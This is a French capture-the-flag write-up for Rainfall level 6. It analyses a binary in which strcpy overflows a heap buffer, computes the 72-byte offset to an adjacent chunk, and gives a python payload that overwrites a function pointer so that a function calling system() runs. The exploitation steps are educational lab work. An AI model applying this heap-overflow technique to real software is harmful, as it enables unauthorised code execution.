i---

# Rainfall — Level 6

## Objectif

Analyser et exploiter le binaire `level6` afin d’obtenir l’exécution de code avec les privilèges du niveau suivant, puis récupérer le mot de passe de `level7`.

---

## 1. Analyse initiale

### 1.1. Fonction `main`

Désassemblage :

```bash
(gdb) disas main
```

Points importants observés :

```asm
0x08048485 <+9>:  movl   $0x40,(%esp)
0x0804848c <+16>: call   0x8048350 <malloc@plt>
0x08048491 <+21>: mov    %eax,0x1c(%esp)

0x08048495 <+25>: movl   $0x4,(%esp)
0x0804849c <+32>: call   0x8048350 <malloc@plt>
0x080484a1 <+37>: mov    %eax,0x18(%esp)

0x080484a5 <+41>: mov    $0x8048468,%edx
0x080484aa <+46>: mov    0x18(%esp),%eax
0x080484ae <+50>: mov    %edx,(%eax)

0x080484c5 <+73>: call   0x8048340 <strcpy@plt>

0x080484ce <+82>: mov    (%eax),%eax
0x080484d0 <+84>: call   *%eax
```

Interprétation :

* `malloc(0x40)` alloue un buffer de **64 octets** sur le **heap**. Son adresse de retour est sauvegardée sur la stack (slot local `0x1c(%esp)`).
* `malloc(0x4)` alloue **4 octets** sur le heap, utilisés ici comme stockage d’un **pointeur de fonction**. Son adresse est sauvegardée sur la stack (`0x18(%esp)`).
* L’adresse `0x08048468` est écrite dans le second chunk (`*(malloc(4)) = 0x08048468`).
* `strcpy(dest, src)` copie `argv[1]` dans le buffer de 64 octets **sans contrôle de taille**.
* Enfin, le programme déréférence le pointeur stocké dans le second chunk et l’appelle (`call *%eax`).

Conclusion : vulnérabilité de type **heap overflow** via `strcpy`, permettant d’écraser un **pointeur de fonction** stocké dans un chunk adjacent.

---

## 1.2. Fonctions `m` et `n`

Deux fonctions intéressantes sont présentes :

### Fonction `m` (cible initiale)

```bash
(gdb) disas m
```

Elle appelle `puts` et affiche un message. Adresse de `m` : **`0x08048468`**.

### Fonction `n` (cible souhaitée)

```bash
(gdb) disas n
```

Elle appelle `system()` :

```asm
0x08048461 <+13>: call   0x8048370 <system@plt>
```

Adresse de `n` : **`0x08048454`**.

Objectif : remplacer l’adresse stockée (initialement `m`) par l’adresse de `n`, afin que le `call` indirect exécute `system()`.

---

## 2. Compréhension du passage de `argv[1]`

Dans `main` :

```asm
mov    0xc(%ebp),%eax   ; eax = argv
add    $0x4,%eax        ; eax = &argv[1]
mov    (%eax),%eax      ; eax = argv[1]
```

Donc `strcpy` reçoit bien `argv[1]` comme source.

---

## 3. Calcul de l’offset d’écrasement (distance heap)

Un breakpoint est placé juste après chaque `malloc`, puis lecture de `eax` :

* Après `malloc(0x40)` : `eax = 0x804a008`
* Après `malloc(0x4)` :  `eax = 0x804a050`

Distance :

* `0x804a050 - 0x804a008 = 0x48`
* `0x48` en décimal = **72**

Interprétation :

* 64 octets correspondent à la zone utilisateur du premier chunk (`malloc(0x40)`).
* Les 8 octets restants correspondent à l’overhead/alignement entre les deux chunks (métadonnées de l’allocateur).
* L’offset total pour atteindre le début du second chunk (zone utilisateur) est donc :

```
64 + 8 = 72
```

---

## 4. Exploitation

### 4.1. Principe

1. Remplir le premier chunk avec 72 octets afin d’atteindre la zone du second chunk.
2. Écraser les 4 octets du pointeur de fonction (initialement `0x08048468`) par l’adresse de `n` (`0x08048454`).
3. Lors de l’appel indirect final, exécution de `n()` → appel à `system()`.

### 4.2. Endianness

Sur x86 (little-endian), l’adresse `0x08048454` s’écrit :

```
"\x54\x84\x04\x08"
```

Aucun octet nul (`\x00`) n’est présent, ce qui est compatible avec `strcpy` (copie jusqu’au premier `\x00`).

---

## 5. Payload final

Commande :

```bash
./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')
```

Effet attendu :

* `strcpy` déborde du premier chunk et écrase le pointeur de fonction stocké dans le second chunk.
* Le `call *%eax` final redirige vers `n()`.
* `n()` exécute `system(...)`, ce qui permet d’obtenir le flag.


---
